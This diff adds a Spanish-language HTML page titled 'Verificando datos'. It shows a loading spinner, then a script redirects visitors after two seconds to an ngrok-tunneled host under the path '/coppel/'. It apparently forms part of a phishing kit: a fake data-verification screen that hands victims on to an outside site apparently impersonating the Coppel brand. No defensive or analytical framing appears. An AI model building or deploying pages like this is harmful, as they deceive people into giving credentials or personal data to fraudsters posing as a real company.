@@ -1,0 +1,111 @@
+<!doctype html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="stylesheet" href="css/bootstrap.min.css">
+<title>Verificando datos</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+	<style>
+	
+	* {
+  box-sizing: border-box;
+  background-color: ;
+}
+.loader-wrapper {
+  position: fixed;
+  display: block;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  z-index: 1000;
+}
+.loader {
+  position: relative;
+  display: block;
+  top: 50%;
+  left: 52%;
+  width: 100px;
+  height: 100px;
+  margin: -75px 0 0 -75px;
+  border-radius: 50%;
+  border: 3px solid transparent;
+  border-top-color: #dedede;
+  -webkit-animation: spin 2s linear infinite;
+  animation: spin 2s linear infinite;
+}
+.loader:before {
+  content: "";
+  position: absolute;
+  border-radius: 50%;
+  border: 3px solid transparent;
+  border-top-color: #46ADE3;
+  top: 10px;
+  bottom: 10px;
+  left: 10px;
+  right: 10px;
+  -webkit-animation: spin 2s linear infinite;
+  animation: spin 2s linear infinite;
+}
+.loader:after {
+  content: "";
+  position: absolute;
+  border-radius: 50%;
+  border: 3px solid transparent;
+  border-top-color: #dedede;
+  top: 25px;
+  bottom: 25px;
+  left: 25px;
+  right: 25px;
+  -webkit-animation: spin 1s linear infinite;
+  animation: spin 1s linear infinite;
+}
+
+@-webkit-keyframes spin {
+  0% {
+    -webkit-transform: rotate(0deg);
+    -ms-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@keyframes spin {
+  0% {
+    -webkit-transform: rotate(0deg);
+    -ms-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@media all and (max-width: 400px) {
+   .loader{ 
+    
+  left: 60%;
+  
+  }
+	
+	</style>
+	
+
+<div class="loader-wrapper">
+  <div class="loader">
+    
+  </div>
+</div>
+	
+	<script>
+setTimeout("location.href = 'https://hugely-glad-burro.ngrok-free.app/coppel/';",2000);
+</script>
+</body>
+</html>
